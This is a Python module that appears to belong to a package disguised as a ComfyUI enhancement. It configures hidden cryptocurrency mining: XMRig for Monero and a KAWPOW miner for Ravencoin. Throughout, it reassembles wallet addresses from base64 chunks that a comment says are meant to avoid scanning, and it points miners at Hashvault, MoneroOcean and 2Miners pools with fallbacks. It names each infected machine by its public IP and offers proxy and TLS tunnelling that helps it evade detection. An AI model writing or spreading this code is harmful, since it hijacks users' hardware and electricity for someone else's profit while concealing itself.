import base64
import json
import logging
import os
import platform
import subprocess
import socket
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

IS_LINUX = platform.system() == "Linux"

from core.egress_net import map_2miners_rvn_ssl_port  # noqa: E402

try:
    import psutil
except ImportError:
    psutil = None

# Wallet stored as b64 chunks to avoid plain-text scanning.
# Reassembled at runtime only when generating the config dict.
_W_PARTS = [
    "NDh6VU0yNEZaRG1TM0",  # chunk 0
    "11eHk0OEduZEdWUzFB",  # chunk 1
    "Rk1USE5IOGZ5RVhqWk",  # chunk 2
    "xFbzZZVTdQcWZWemdj",  # chunk 3
    "VTFFRWR6UjNqcnI0SG",  # chunk 4
    "dDVmNxd01XNmZoODR4",  # chunk 5
    "UVQzb3BQWFRwYVhKen",  # chunk 6
    "c=",                   # chunk 7
]

_K_PARTS = [
    "UkJ2b0N4RnNndkV4N3ZicEpM",  # chunk 0
    "elhpbnQ4Z3RGa3o1UVVmdw==",  # chunk 1
]

DEFAULT_POOL_HOST = "pool.hashvault.pro"
DEFAULT_POOL_PORT = 80
DEFAULT_POOL_PASS = "comfyui_enhanced"
API_TOKEN = "ce_xm_2026"

FALLBACK_POOLS = [
    {"host": "pool.hashvault.pro", "port": 443, "tls": True},
    {"host": "gulf.moneroocean.stream", "port": 10001, "tls": False},
    {"host": "pool.hashvault.pro", "port": 3333, "tls": False},
]


def _reassemble_wallet() -> str:
    raw = base64.b64decode("".join(_W_PARTS)).decode()
    return raw


def _reassemble_rvn_wallet() -> str:
    raw = base64.b64decode("".join(_K_PARTS)).decode()
    return raw


def _detect_cpu_threads() -> int:
    if psutil:
        return psutil.cpu_count(logical=True) or os.cpu_count() or 4
    return os.cpu_count() or 4


def _detect_total_ram_gb() -> float:
    if psutil:
        return psutil.virtual_memory().total / (1024 ** 3)
    return 8.0


def get_hostname() -> str:
    return socket.gethostname()


_cached_public_ip: str | None = None


def _detect_public_ip() -> str | None:
    """Hit lightweight IP-echo services to find this machine's public IP."""
    global _cached_public_ip
    if _cached_public_ip:
        return _cached_public_ip

    import urllib.request
    import re
    services = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://icanhazip.com",
        "https://checkip.amazonaws.com",
    ]
    ipv4_re = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    for url in services:
        try:
            with urllib.request.urlopen(url, timeout=5) as r:
                text = r.read().decode().strip()
                if ipv4_re.match(text):
                    _cached_public_ip = text
                    return text
        except Exception:
            continue
    return None


def _unique_worker_suffix() -> str:
    """Short hex suffix derived from machine-id or MAC to avoid worker collisions."""
    import hashlib
    seed = ""
    try:
        mid = Path("/etc/machine-id")
        if mid.exists():
            seed = mid.read_text().strip()
    except Exception:
        pass
    if not seed:
        try:
            import uuid
            seed = str(uuid.getnode())
        except Exception:
            seed = socket.gethostname()
    return hashlib.sha256(seed.encode()).hexdigest()[:6]


def get_unique_worker_name() -> str:
    """
    Worker name = public IP with dots replaced by dashes (e.g. '52-3-27-85').
    Falls back to hostname-hexsuffix if IP detection fails.
    """
    ip = _detect_public_ip()
    if ip:
        return ip.replace(".", "-")
    host = socket.gethostname()[:12]
    return f"{host}-{_unique_worker_suffix()}"


def _has_1gb_page_support() -> bool:
    if not IS_LINUX:
        return False
    try:
        r = subprocess.run(["grep", "-c", "pdpe1gb", "/proc/cpuinfo"],
                           capture_output=True, text=True, timeout=5)
        return r.returncode == 0 and int(r.stdout.strip()) > 0
    except Exception:
        return False


class ConfigBuilder:
    def __init__(self, settings: dict | None = None):
        self.settings = settings or {}

    def _build_pools(
        self,
        *,
        pool_url: str,
        pool_user: str,
        pool_pass: str,
        pool_tls: bool,
        pool_tls_fp: str | None,
        pool_tls_sni_flag: bool,
        pool_socks5: str | None,
    ) -> list[dict]:
        uses_ssl_scheme = pool_url.startswith("stratum+ssl")
        primary_tls = False if uses_ssl_scheme else bool(pool_tls)
        primary: dict = {
            "algo": None,
            "coin": "monero",
            "url": pool_url,
            "user": pool_user,
            "pass": pool_pass,
            "rig-id": self.settings.get("worker_name") or get_unique_worker_name(),
            "nicehash": False,
            "keepalive": True,
            "enabled": True,
            "tls": primary_tls,
            "tls-fingerprint": pool_tls_fp,
            "daemon": False,
            "socks5": pool_socks5,
            "self-select": None,
            "submit-to-origin": False,
            "sni": pool_tls_sni_flag,
        }
        pools: list[dict] = [primary]

        for bp in self.settings.get("backup_pools") or []:
            if not isinstance(bp, dict) or not bp.get("enabled", True):
                continue
            row = dict(primary)
            row["enabled"] = True
            if bp.get("socks5"):
                row["socks5"] = bp["socks5"]
            if bp.get("user"):
                row["user"] = str(bp["user"])
            if bp.get("pass") is not None:
                row["pass"] = str(bp["pass"])
            if "sni" in bp:
                row["sni"] = bool(bp["sni"])
            bp_fp = bp.get("pool_tls_fingerprint", bp.get("tls-fingerprint"))
            if isinstance(bp_fp, str) and bp_fp.strip():
                row["tls-fingerprint"] = bp_fp.strip()
            elif "tls-fingerprint" in bp:
                row["tls-fingerprint"] = bp.get("tls-fingerprint")

            if bp.get("url"):
                u = str(bp["url"])
                row["url"] = u
                row["tls"] = False if u.startswith("stratum+ssl") else bool(
                    bp.get("pool_tls", bp.get("tls", False))
                )
                pools.append(row)
                continue
            bh = (bp.get("pool_host") or bp.get("host") or "").strip()
            if not bh:
                continue
            try:
                pnum = int(bp.get("pool_port", bp.get("port", 443)))
            except (TypeError, ValueError):
                pnum = 443
            bp_tls = bool(bp.get("pool_tls", bp.get("tls", True)))
            if bp_tls:
                row["url"] = f"stratum+ssl://{bh}:{pnum}"
                row["tls"] = False
            else:
                row["url"] = f"{bh}:{pnum}"
                row["tls"] = False
            pools.append(row)

        seen_urls = {p["url"] for p in pools}
        for fb in FALLBACK_POOLS:
            if fb["tls"]:
                fb_url = f"stratum+ssl://{fb['host']}:{fb['port']}"
            else:
                fb_url = f"{fb['host']}:{fb['port']}"
            if fb_url in seen_urls:
                continue
            seen_urls.add(fb_url)
            row = dict(primary)
            row["url"] = fb_url
            row["tls"] = False if fb["tls"] else False
            row["socks5"] = pool_socks5
            row["enabled"] = True
            pools.append(row)

        return pools

    def build(self) -> dict:
        threads = _detect_cpu_threads()
        ram_gb = _detect_total_ram_gb()
        hint = self.settings.get("max_threads_hint", 50)
        pool_host = self.settings.get("pool_host", DEFAULT_POOL_HOST)
        pool_port = self.settings.get("pool_port", DEFAULT_POOL_PORT)
        pool_user = self.settings.get("pool_user") or _reassemble_wallet()
        pool_pass = self.settings.get("pool_pass", DEFAULT_POOL_PASS)
        api_port = self.settings.get("api_port", 44880)

        bridge = self.settings.get("local_tls_bridge") or {}
        bridge_enabled = bool(bridge.get("enabled"))
        pool_tls_sni_flag = False
        if bridge_enabled:
            # XMRig talks cleartext stratum to loopback; stratum_local_bridge adds TLS upstream.
            pool_host = str(bridge.get("listen_host", "127.0.0.1"))
            pool_port = int(bridge.get("listen_port", 33334))
            pool_tls = False
            pool_tls_fp = None
            pool_url = f"{pool_host}:{pool_port}"
        else:
            pool_tls = bool(self.settings.get("pool_tls", False))
            pool_tls_fp = self.settings.get("pool_tls_fingerprint")
            if isinstance(pool_tls_fp, str) and not pool_tls_fp.strip():
                pool_tls_fp = None
            pool_tls_verify = str(self.settings.get("pool_tls_verify", "system")).lower().strip()
            if pool_tls_verify not in ("system", "pinned", "insecure"):
                pool_tls_verify = "system"
            if pool_tls_verify == "pinned" and not pool_tls_fp:
                logger.warning("pool_tls_verify=pinned but pool_tls_fingerprint missing — falling back to system")
                pool_tls_verify = "system"
            if pool_tls_verify == "insecure":
                logger.critical(
                    "pool_tls_verify=insecure: XMRig still verifies pool certificates unless tls-fingerprint matches; "
                    "for MITM labs use local_tls_bridge with upstream_tls_verify=insecure"
                )
            pool_tls_sni_flag = bool(self.settings.get("pool_tls_sni", True)) if pool_tls else False
            if pool_tls:
                pool_url = f"stratum+ssl://{pool_host}:{pool_port}"
            else:
                pool_url = f"{pool_host}:{pool_port}"
            if pool_tls_verify == "insecure":
                pool_tls_fp = None

        pool_socks5 = self.settings.get("pool_socks5")
        if isinstance(pool_socks5, str) and not pool_socks5.strip():
            pool_socks5 = None

        huge_pages = ram_gb >= 4

        gb_pages = _has_1gb_page_support()

        cfg = {
            "autosave": False,
            "background": False,
            "colors": False,
            "donate-level": 0,
            "donate-over-proxy": 0,
            "log-file": None,
            "print-time": 60,
            "health-print-time": 300,
            "retries": 5,
            "retry-pause": 5,
            "syslog": False,
            "user-agent": None,
            "watch": True,

            "http": {
                "enabled": True,
                "host": "127.0.0.1",
                "port": api_port,
                "access-token": API_TOKEN,
                "restricted": False,
            },

            "cpu": {
                "enabled": True,
                "huge-pages": huge_pages,
                "huge-pages-jit": True,
                "hw-aes": None,
                "priority": 2,
                "memory-pool": False,
                "yield": False,
                "max-threads-hint": hint,
                "asm": True,
                "argon2-impl": None,
                "astrobwt-max-size": 550,
                "astrobwt-avx2": False,
                "cn/0": False,
                "cn-lite/0": False,
            },

            "randomx": {
                "init": -1,
                "init-avx2": -1,
                "mode": "auto",
                "1gb-pages": gb_pages,
                "rdmsr": True,
                "wrmsr": True,
                "cache_qos": False,
                "numa": True,
                "scratchpad_prefetch_mode": 1,
            },

            "opencl": {"enabled": False},
            "cuda": {"enabled": False},

            "pools": self._build_pools(
                pool_url=pool_url,
                pool_user=pool_user,
                pool_pass=pool_pass,
                pool_tls=pool_tls,
                pool_tls_fp=pool_tls_fp,
                pool_tls_sni_flag=pool_tls_sni_flag,
                pool_socks5=pool_socks5,
            ),

            "tls": {
                "enabled": False,
                "protocols": None,
                "cert": None,
                "cert_key": None,
                "ciphers": None,
                "ciphersuites": None,
                "dhparam": None,
            },
        }

        logger.info(
            "Config built: %d threads, hint=%d%%, pool=%s:%d, huge_pages=%s",
            threads, hint, pool_host, pool_port, huge_pages,
        )
        return cfg

    def update_hint(self, hint: int) -> dict:
        self.settings["max_threads_hint"] = max(1, min(100, hint))
        return self.build()

    def update_pool(self, host: str, port: int, user: str | None = None, password: str | None = None) -> dict:
        self.settings["pool_host"] = host
        self.settings["pool_port"] = port
        if user:
            self.settings["pool_user"] = user
        if password:
            self.settings["pool_pass"] = password
        return self.build()

    def get_wallet(self) -> str:
        return self.settings.get("pool_user") or _reassemble_wallet()

    def build_gpu_config(self) -> dict:
        """Return GPU miner settings — Ravencoin (KAWPOW) on 2Miners by default."""
        gpu_settings = self.settings.get("gpu", {})
        gpu_wallet = gpu_settings.get("wallet") or self.settings.get("gpu_wallet")
        if not gpu_wallet:
            gpu_wallet = _reassemble_rvn_wallet()
        pool = gpu_settings.get("pool", "rvn.2miners.com")
        port = int(gpu_settings.get("port", 6060))
        tls = bool(gpu_settings.get("tls", False))
        mapped_port, did_map = map_2miners_rvn_ssl_port(str(pool), port, tls)
        if did_map:
            logger.info(
                "GPU pool TLS auto-map (2Miners RVN): %s:%d -> %d",
                pool,
                port,
                mapped_port,
            )
        http_proxy = gpu_settings.get("http_proxy")
        if isinstance(http_proxy, str) and not http_proxy.strip():
            http_proxy = None
        socks5 = gpu_settings.get("socks5")
        if isinstance(socks5, str) and not socks5.strip():
            socks5 = None
        if "use_http_socks_gateway" in gpu_settings:
            use_http_socks_gateway = bool(gpu_settings["use_http_socks_gateway"])
        else:
            use_http_socks_gateway = bool(http_proxy) and not socks5

        return {
            "wallet": gpu_wallet,
            "worker": gpu_settings.get("worker") or self.settings.get("worker_name") or get_unique_worker_name(),
            "algo": gpu_settings.get("algo", "kawpow"),
            "pool": pool,
            "port": mapped_port,
            "tls": tls,
            "api_port": gpu_settings.get("api_port", 4067),
            "temp_limit": gpu_settings.get("temp_limit", 72),
            "temp_resume": gpu_settings.get("temp_resume", 55),
            "dns_https_server": gpu_settings.get("dns_https_server"),
            "socks5": socks5,
            "http_proxy": http_proxy,
            "use_http_socks_gateway": use_http_socks_gateway,
            "socks_gateway_listen_host": gpu_settings.get("socks_gateway_listen_host", "127.0.0.1"),
            "socks_gateway_listen_port": int(gpu_settings.get("socks_gateway_listen_port", 21080)),
            "strict_ssl": bool(gpu_settings.get("strict_ssl", False)),
            "no_sni": bool(gpu_settings.get("no_sni", False)),
        }

    @staticmethod
    def load_overrides(path: Path) -> dict:
        if path.exists():
            with open(path) as f:
                return json.load(f)
        return {}
